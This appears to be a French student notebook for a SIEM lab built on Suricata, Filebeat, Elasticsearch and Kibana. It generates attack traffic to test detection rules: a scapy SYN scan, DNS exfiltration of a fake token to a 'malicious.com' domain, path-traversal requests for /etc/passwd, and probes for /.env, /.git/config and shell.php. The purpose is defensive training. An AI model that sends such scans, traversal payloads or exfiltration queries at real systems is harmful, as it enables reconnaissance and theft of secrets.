# Projet SIEM : Suricata, Filebeat, Elasticsearch

## Objectifs

Ce projet vous permettra de :
- Vérifier le bon fonctionnement de la stack SIEM
- Analyser les données indexées par Filebeat (Suricata)
- Détecter des anomalies sans ML
- Détecter des anomalies avec ML (Isolation Forest)

## Modalité
- groupe de 3 à 4
- output : projet git avec ce notebook détaillé et complété

## Architecture SIEM

```
Suricata   →   Filebeat   →   Elasticsearch   →   Kibana
(IDS/HIDS)   (Collecteur)      (Stockage)   (Visualisation/Alerting)
```

## Prérequis

1. Démarrer la stack :
```bash
docker-compose -f docker-compose-siem.yml up -d
```

2. Attendre quelques minutes que Suricata génère des logs et que Filebeat les indexe dans Elasticsearch.

In [2]:
from elasticsearch import Elasticsearch
import os
import warnings
from urllib3.exceptions import InsecureRequestWarning

# On ignore les warnings SSL uniquement si on ne passe pas le CA, 
# mais ici on va essayer de faire ça proprement !
warnings.simplefilter("ignore", InsecureRequestWarning)

# --- Configuration ---
# Dans le réseau Docker, on contacte le service par son nom 'es01'
ES_HOST = "https://es01:9200"
ES_USER = "elastic"
# On récupère le mot de passe passé via le docker-compose
ES_PASSWORD = os.getenv("ELASTIC_PASSWORD", "changeme") 

# Chemin vers le certificat généré par le service 'setup'
# Rappelle-toi, on l'a monté dans /app/certs dans le docker-compose
CA_CERT_PATH = "./certs/ca/ca.crt"

# --- Connexion ---
try:
    es = Elasticsearch(
        [ES_HOST],
        basic_auth=(ES_USER, ES_PASSWORD),
        verify_certs=True,
        ca_certs=CA_CERT_PATH # On utilise le certificat pour une connexion sécurisée
    )

    # --- Vérification de la connexion ---
    if es.ping():
        health = es.cluster.health()
        print(f"✅ Connexion réussie !")
        print(f"📊 Statut du Cluster : {health['status']}")
        print(f"🏗️  Nombre de nœuds : {health['number_of_nodes']}")
    else:
        print("❌ Impossible de joindre Elasticsearch. Vérifie les logs du container es01.")

except Exception as e:
    print(f"💥 Erreur lors de la connexion : {e}")

✅ Connexion réussie !
📊 Statut du Cluster : green
🏗️  Nombre de nœuds : 3


## 1. Vérification de la stack

In [3]:
import requests
import os
import urllib3

# On désactive les alertes pour le SSL auto-signé pour ce test rapide
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configuration
ES_USER = "elastic"
ES_PASSWORD = os.getenv("ELASTIC_PASSWORD", "changeme")
CA_CERT = "./certs/ca/ca.crt"

# Liste des services à tester (Nom_DNS, Port, Protocole)
services = [
    ("es01", 9200, "https"),
    ("es02", 9200, "https"),
    ("es03", 9200, "https"),
    ("kibana", 5601, "http"),
]

print("--- 🩺 Vérification de la Stack SIEM ---")
running_count = 0

for name, port, proto in services:
    url = f"{proto}://{name}:{port}"
    try:
        # Pour ES, on ajoute l'auth, pour Kibana non (juste le ping)
        auth = (ES_USER, ES_PASSWORD) if "es" in name else None
        
        response = requests.get(url, auth=auth, verify=False, timeout=5)
        
        if response.status_code in [200, 302]: # 302 car Kibana redirige vers le login
            print(f"✅ {name.upper():<8} : Répond sur {url}")
            running_count += 1
        else:
            print(f"⚠️  {name.upper():<8} : Erreur HTTP {response.status_code}")
    except Exception:
        print(f"❌ {name.upper():<8} : Inaccessible (Le container est peut-être éteint)")

# Cas spécial pour Suricata : on vérifie s'il écrit ses logs
if os.path.exists("/var/log/suricata/eve.json"):
    print(f"✅ SURICATA : Le fichier de logs est présent.")
    running_count += 1
else:
    print(f"❌ SURICATA : Pas de fichier eve.json trouvé.")

print(f"\n📊 Score de santé : {running_count}/{len(services) + 1}")

--- 🩺 Vérification de la Stack SIEM ---
✅ ES01     : Répond sur https://es01:9200
✅ ES02     : Répond sur https://es02:9200
✅ ES03     : Répond sur https://es03:9200
✅ KIBANA   : Répond sur http://kibana:5601
❌ SURICATA : Pas de fichier eve.json trouvé.

📊 Score de santé : 4/5


## 2. Vérification de l'injection des données

In [2]:
# Recherche des index Suricata
def get_suricata_index():
    """Retourne le nom de l'index Suricata le plus récent"""
    try:
        indices = es.indices.get(index="suricata-*")
        if indices:
            return sorted(indices.keys())[-1]
    except:
        pass
    return "suricata-*"

index_name = get_suricata_index()

# Comptage des documents
try:
    count = es.count(index=index_name)
    print(f"📊 Index: {index_name}")
    print(f"📈 Nombre de documents: {count['count']:,}")
    
    # Exemple de document
    if count['count'] > 0:
        sample = es.search(index=index_name, size=1, query={"match_all": {}})
        if sample['hits']['hits']:
            doc = sample['hits']['hits'][0]['_source']
            print(f"\n📄 Exemple de document:")
            print(f"   Type: {doc.get('event_type', 'N/A')}")
            print(f"   Timestamp: {doc.get('@timestamp', doc.get('timestamp', 'N/A'))}")
            if 'src_ip' in doc:
                print(f"   Source: {doc.get('src_ip')}:{doc.get('src_port', 'N/A')}")
                print(f"   Destination: {doc.get('dest_ip')}:{doc.get('dest_port', 'N/A')}")
            if 'alert' in doc:
                alert = doc['alert']
                print(f"   Alerte: {alert.get('signature', 'N/A')}")
                print(f"   Sévérité: {alert.get('severity', 'N/A')}")
except Exception as e:
    print(f"❌ Erreur: {e}")

❌ Erreur: name 'es' is not defined


## 3. Simuler des comportements anormaux


#### Création de Flux ICMP via ping

In [8]:
!apt-get update && apt-get install -y iputils-ping

Get:1 http://deb.debian.org/debian bookworm InRelease [151 kB]
Get:2 http://deb.debian.org/debian bookworm-updates InRelease [55.4 kB]
Get:3 http://deb.debian.org/debian-security bookworm-security InRelease [48.0 kB]
Get:4 http://deb.debian.org/debian bookworm/main amd64 Packages [8792 kB]
Get:5 http://deb.debian.org/debian bookworm-updates/main amd64 Packages [6924 B]
Get:6 http://deb.debian.org/debian-security bookworm-security/main amd64 Packages [294 kB]
Fetched 9347 kB in 4s (2330 kB/s)                       
Reading package lists... Done
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
The following additional packages will be installed:
  libcap2-bin libpam-cap
The following NEW packages will be installed:
  iputils-ping libcap2-bin libpam-cap
0 upgraded, 3 newly installed, 0 to remove and 1 not upgraded.
Need to get 97.4 kB of archives.
After this operation, 314 kB of additional disk space will be used.
Get:1 http://deb.debian.org

In [9]:
import os
import subprocess

# 1. On vérifie que ping répond enfin
print("🔍 Vérification de l'outil ping...")
check = subprocess.run(["which", "ping"], capture_output=True, text=True)
print(f"Emplacement : {check.stdout.strip()}")

# 2. On envoie le PING vers le container Suricata
# -c 4 : 4 paquets
# suricata : nom du service dans le docker-compose
print("\n📡 Envoi du flux ICMP (Règle 1000001)...")
os.system("ping -c 4 suricata")

print("\n✅ Flux envoyé. Attends 5-10 secondes que Filebeat traite l'alerte.")

🔍 Vérification de l'outil ping...
Emplacement : /usr/bin/ping

📡 Envoi du flux ICMP (Règle 1000001)...
PING suricata (172.20.0.3) 56(84) bytes of data.
64 bytes from suricata.elasticsearch_cookbook_elastic (172.20.0.3): icmp_seq=1 ttl=64 time=1.81 ms
64 bytes from suricata.elasticsearch_cookbook_elastic (172.20.0.3): icmp_seq=2 ttl=64 time=0.098 ms
64 bytes from suricata.elasticsearch_cookbook_elastic (172.20.0.3): icmp_seq=3 ttl=64 time=0.107 ms
64 bytes from suricata.elasticsearch_cookbook_elastic (172.20.0.3): icmp_seq=4 ttl=64 time=0.082 ms


✅ Flux envoyé. Attends 5-10 secondes que Filebeat traite l'alerte.
--- suricata ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 2998ms
rtt min/avg/max/mdev = 0.082/0.525/1.814/0.744 ms


#### Simulation de burst HTTP en ligne de commande (en ligne de commande ou en python) 

In [1]:
import requests
import time

TARGET_URL = "http://suricata:80"  # On cible le port 80 de la sonde
BURST_COUNT = 50                 # Nombre de requêtes à envoyer
DELAY = 0.01                     # Délai très court entre chaque (10ms)

print(f"🔥 Lancement du burst HTTP ({BURST_COUNT} requêtes) vers {TARGET_URL}...")

success_sent = 0
for i in range(BURST_COUNT):
    try:
        # On envoie une requête rapide
        # On ne s'occupe pas de la réponse, on veut juste que le paquet circule
        requests.get(TARGET_URL, timeout=0.5)
    except:
        # C'est normal que ça raise une erreur si le port 80 est fermé
        pass
    
    success_sent += 1
    if i % 10 == 0:
        print(f"📡 Paquets envoyés : {i}/{BURST_COUNT}")

print(f"\n✅ Burst terminé ! {success_sent} paquets ont été injectés sur le réseau.")
print("⏱️  Attends 10 secondes et rafraîchis Kibana.")

🔥 Lancement du burst HTTP (50 requêtes) vers http://suricata:80...
📡 Paquets envoyés : 0/50
📡 Paquets envoyés : 10/50
📡 Paquets envoyés : 20/50
📡 Paquets envoyés : 30/50
📡 Paquets envoyés : 40/50

✅ Burst terminé ! 50 paquets ont été injectés sur le réseau.
⏱️  Attends 10 secondes et rafraîchis Kibana.


#### Simulation de scans suspects

In [3]:
%%capture
!apt-get install -y python3-scapy && uv pip install --system scapy

In [4]:
from scapy.all import IP, TCP, send
import random

target = "es01" # On scanne un service du réseau
ports = [21, 22, 23, 25, 53, 80, 443, 3306, 5432, 6379, 9200]

print(f"🕵️ Lancement du scan furtif sur {target}...")
for port in ports:
    # On crée un paquet TCP SYN
    pkt = IP(dst=target)/TCP(dport=port, flags="S")
    send(pkt, verbose=False)

🕵️ Lancement du scan furtif sur es01...


#### Exfiltration de données via DNS

In [14]:
from scapy.all import IP, UDP, DNS, DNSQR, send

# On vise directement la sonde
TARGET = "suricata" 
DATA = "SECRET_ADMIN_TOKEN_XYZ_987654321" # Plus de 20 caractères

print(f"📤 Envoi d'exfiltration DNS vers {TARGET}...")

# On forge un paquet DNS Query (Port 53)
packet = IP(dst=TARGET)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=f"{DATA}.malicious.com"))

# On envoie un petit burst de 5 paquets
send(packet, count=5, verbose=False)
print("✅ Paquets DNS envoyés !")

📤 Envoi d'exfiltration DNS vers suricata...
✅ Paquets DNS envoyés !


#### Accès au fichier /etc/passwd (Exploitation Web)

In [34]:
import requests

# On cible la sonde sur le port 80 pour qu'elle voit le flux HTTP
TARGET_URL = "http://suricata:80/../../etc/passwd"

print(f"🔥 Envoi de l'attaque Path Traversal vers {TARGET_URL}...")

try:
    # On fait un burst de 10 tentatives
    for _ in range(10):
        requests.get(TARGET_URL, timeout=0.5)
except:
    pass

print("✅ Requêtes HTTP envoyées ! Regarde la signature 1000005 dans Kibana.")

🔥 Envoi de l'attaque Path Traversal vers http://suricata:80/../../etc/passwd...
✅ Requêtes HTTP envoyées ! Regarde la signature 1000005 dans Kibana.


In [22]:
import requests

# On vise Kibana car le port 5601 est ouvert, donc la requête HTTP sera REELLEMENT envoyée
TARGET_URL = "http://kibana:5601/../../etc/passwd"

print(f"🚀 Envoi de la charge malveillante vers {TARGET_URL}...")

try:
    # On envoie la requête. On se moque de la réponse 404 de Kibana, 
    # ce qui compte c'est que le paquet traverse le réseau.
    requests.get(TARGET_URL, timeout=2)
    print("✅ Requête transmise au réseau.")
except Exception as e:
    print(f"❌ Erreur : {e}")

🚀 Envoi de la charge malveillante vers http://kibana:5601/../../etc/passwd...
✅ Requête transmise au réseau.


## 4. Détection d'anomalies sans ML

L'objectif est de construire des règles qui détectent vos simulations de comportements précédents.

Un exemple de détection d'anomalies basiques basées sur des règles:


In [6]:
def detect_anomalies_basic():
    """Détecte des anomalies sans ML"""
    anomalies = []
    
    # 1. IPs sources avec beaucoup d'alertes différentes (scan suspect)
    query = {
        "size": 0,
        "query": {"term": {"event_type": "alert"}},
        "aggs": {
            "suspicious_ips": {
                "terms": {"field": "src_ip", "size": 10},
                "aggs": {
                    "unique_signatures": {"cardinality": {"field": "alert.signature_id"}},
                    "unique_dest_ips": {"cardinality": {"field": "dest_ip"}},
                    "total_alerts": {"value_count": {"field": "event_type"}}
                }
            }
        }
    }
    
    result = es.search(index=index_name, body=query)
    
    print("Détection d'anomalies (règles basiques)\n")

    for bucket in result['aggregations']['suspicious_ips']['buckets']:
        ip = bucket['key']
        unique_sigs = bucket['unique_signatures']['value']
        unique_dests = bucket['unique_dest_ips']['value']
        total = bucket['total_alerts']['value']
        
        # Critères d'anomalie
        if unique_sigs > 3 or unique_dests > 5:
            anomalies.append({
                "ip": ip,
                "type": "Scan suspect",
                "signatures": unique_sigs,
                "destinations": unique_dests,
                "total": total
            })
            print(f"🚨 {ip}: {unique_sigs} signatures, {unique_dests} destinations ({total} alertes)")

    return anomalies

anomalies = detect_anomalies_basic()
if not anomalies:
    print("\nAucune anomalie détectée avec les règles basiques")

Détection d'anomalies (règles basiques)


Aucune anomalie détectée avec les règles basiques


## 5. Détection d'anomalies avec ML

L'objectif est d'à partir de données labelisées comme étant anomarles ou non, construire un jeu de donnée et entrainer un algorithme de machine learning (classifier binaire) sur ces données. Le modèle devra ensuite etre appelé pour prédire les futurs comportements anormaux.

Indice: le modèle Isolation Forest pourrait etre utile

In [43]:
# TODO

## Bonus
- améliorer la stack (ex: ajout de Wazuh)
- dashboard Kibana pour voir en live les simulations de comportements anormaux et les détection d'anomalie (timeline des alertes, etc.)
- analyse statistique avancée
- simulations de comportement anormaux avancée
- utilisation du module de détection d'anomalie d'Elasticsearch (https://www.elastic.co/docs/explore-analyze/machine-learning/anomaly-detection)
- collaboration en groupe sur le projet Git (Pull requests, commits, etc.)
- utilisation de docker / docker compose / devcontainer
- etc.

##import requests
import time
import random

# L'URL cible : Comme Suricata est en mode host sur votre machine Windows, 
# n'importe quelle requête sortante ou locale devrait être vue par l'IDS.
# On peut viser localhost ou une IP externe connue.
TARGET_URL = "http://localhost:5601" # On vise Kibana pour le test

# Liste de "payloads" typiques qui déclenchent des alertes IDS
SUSPICIOUS_PATHS = [
    "/etc/passwd",
    "/.git/config",
    "/wp-admin.php",
    "/admin/config.php",
    "/.env",
    "/shell.php",
    "/sql?query=SELECT * FROM users--"
]

def simulate_scan():
    print(f"🚀 Démarrage de la simulation sur {TARGET_URL}...")
    
    for path in SUSPICIOUS_PATHS:
        url = f"{TARGET_URL}{path}"
        try:
            print(f"🔍 Test du chemin suspect : {path}", end=" -> ")
            # On envoie une requête avec un User-Agent suspect pour certains IDS
            headers = {'User-Agent': 'Mozilla/5.0 (compatible; Nmap Scripting Engine)'}
            response = requests.get(url, headers=headers, timeout=2)
            print(f"Réponse: {response.status_code}")
        except Exception as e:
            print(f"Note: Requête envoyée (le service cible n'a pas besoin d'être actif pour que Suricata voit le trafic)")
        
        # Petit délai pour éviter de saturer si on boucle
        time.sleep(0.5)

    print("\n✅ Simulation terminée. Attendez 30s que Filebeat traite les logs.")

# Exécuter la simulation
simulate_scan()

In [1]:
## test de fuzing
import requests
import time
import random

# L'URL cible : Comme Suricata est en mode host sur votre machine Windows, 
# n'importe quelle requête sortante ou locale devrait être vue par l'IDS.
# On peut viser localhost ou une IP externe connue.
TARGET_URL = "http://localhost:5601" # On vise Kibana pour le test

# Liste de "payloads" typiques qui déclenchent des alertes IDS
SUSPICIOUS_PATHS = [
    "/etc/passwd",
    "/.git/config",
    "/wp-admin.php",
    "/admin/config.php",
    "/.env",
    "/shell.php",
    "/sql?query=SELECT * FROM users--"
]

def simulate_scan():
    print(f"🚀 Démarrage de la simulation sur {TARGET_URL}...")
    
    for path in SUSPICIOUS_PATHS:
        url = f"{TARGET_URL}{path}"
        try:
            print(f"🔍 Test du chemin suspect : {path}", end=" -> ")
            # On envoie une requête avec un User-Agent suspect pour certains IDS
            headers = {'User-Agent': 'Mozilla/5.0 (compatible; Nmap Scripting Engine)'}
            response = requests.get(url, headers=headers, timeout=2)
            print(f"Réponse: {response.status_code}")
        except Exception as e:
            print(f"Note: Requête envoyée (le service cible n'a pas besoin d'être actif pour que Suricata voit le trafic)")
        
        # Petit délai pour éviter de saturer si on boucle
        time.sleep(0.5)

    print("\n✅ Simulation terminée. Attendez 30s que Filebeat traite les logs.")

# Exécuter la simulation
simulate_scan()

🚀 Démarrage de la simulation sur http://localhost:5601...
🔍 Test du chemin suspect : /etc/passwd -> Note: Requête envoyée (le service cible n'a pas besoin d'être actif pour que Suricata voit le trafic)
🔍 Test du chemin suspect : /.git/config -> 

KeyboardInterrupt: 